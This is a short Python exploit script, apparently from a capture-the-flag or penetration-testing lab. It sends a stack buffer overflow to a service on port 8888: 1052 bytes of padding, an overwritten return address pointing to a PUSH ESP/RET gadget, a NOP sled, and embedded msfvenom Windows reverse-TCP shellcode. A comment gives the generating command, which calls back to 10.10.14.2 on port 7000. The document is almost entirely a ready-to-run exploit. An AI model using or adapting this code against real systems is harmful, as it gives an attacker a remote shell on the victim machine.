import socket
import sys

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=7000 -b '\x00\x0a\x0d' -f python
payload =  b""
payload += b"\xbb\x48\x26\x06\x79\xda\xc3\xd9\x74\x24\xf4\x5f\x2b"
payload += b"\xc9\xb1\x52\x83\xc7\x04\x31\x5f\x0e\x03\x17\x28\xe4"
payload += b"\x8c\x5b\xdc\x6a\x6e\xa3\x1d\x0b\xe6\x46\x2c\x0b\x9c"
payload += b"\x03\x1f\xbb\xd6\x41\xac\x30\xba\x71\x27\x34\x13\x76"
payload += b"\x80\xf3\x45\xb9\x11\xaf\xb6\xd8\x91\xb2\xea\x3a\xab"
payload += b"\x7c\xff\x3b\xec\x61\xf2\x69\xa5\xee\xa1\x9d\xc2\xbb"
payload += b"\x79\x16\x98\x2a\xfa\xcb\x69\x4c\x2b\x5a\xe1\x17\xeb"
payload += b"\x5d\x26\x2c\xa2\x45\x2b\x09\x7c\xfe\x9f\xe5\x7f\xd6"
payload += b"\xd1\x06\xd3\x17\xde\xf4\x2d\x50\xd9\xe6\x5b\xa8\x19"
payload += b"\x9a\x5b\x6f\x63\x40\xe9\x6b\xc3\x03\x49\x57\xf5\xc0"
payload += b"\x0c\x1c\xf9\xad\x5b\x7a\x1e\x33\x8f\xf1\x1a\xb8\x2e"
payload += b"\xd5\xaa\xfa\x14\xf1\xf7\x59\x34\xa0\x5d\x0f\x49\xb2"
payload += b"\x3d\xf0\xef\xb9\xd0\xe5\x9d\xe0\xbc\xca\xaf\x1a\x3d"
payload += b"\x45\xa7\x69\x0f\xca\x13\xe5\x23\x83\xbd\xf2\x44\xbe"
payload += b"\x7a\x6c\xbb\x41\x7b\xa5\x78\x15\x2b\xdd\xa9\x16\xa0"
payload += b"\x1d\x55\xc3\x67\x4d\xf9\xbc\xc7\x3d\xb9\x6c\xa0\x57"
payload += b"\x36\x52\xd0\x58\x9c\xfb\x7b\xa3\x77\x0e\x76\xa5\x85"
payload += b"\x66\x84\xb9\x92\x2e\x01\x5f\xce\xde\x47\xc8\x67\x46"
payload += b"\xc2\x82\x16\x87\xd8\xef\x19\x03\xef\x10\xd7\xe4\x9a"
payload += b"\x02\x80\x04\xd1\x78\x07\x1a\xcf\x14\xcb\x89\x94\xe4"
payload += b"\x82\xb1\x02\xb3\xc3\x04\x5b\x51\xfe\x3f\xf5\x47\x03"
payload += b"\xd9\x3e\xc3\xd8\x1a\xc0\xca\xad\x27\xe6\xdc\x6b\xa7"
payload += b"\xa2\x88\x23\xfe\x7c\x66\x82\xa8\xce\xd0\x5c\x06\x99"
payload += b"\xb4\x19\x64\x1a\xc2\x25\xa1\xec\x2a\x97\x1c\xa9\x55"
payload += b"\x18\xc9\x3d\x2e\x44\x69\xc1\xe5\xcc\x99\x88\xa7\x65"
payload += b"\x32\x55\x32\x34\x5f\x66\xe9\x7b\x66\xe5\x1b\x04\x9d"
payload += b"\xf5\x6e\x01\xd9\xb1\x83\x7b\x72\x54\xa3\x28\x73\x7d"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

foo = padding1 + EIP + NOPS + payload + overrun

try:
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target,8888))
  s.send(foo)
except Exception as e:
  print(sys.exc_value)
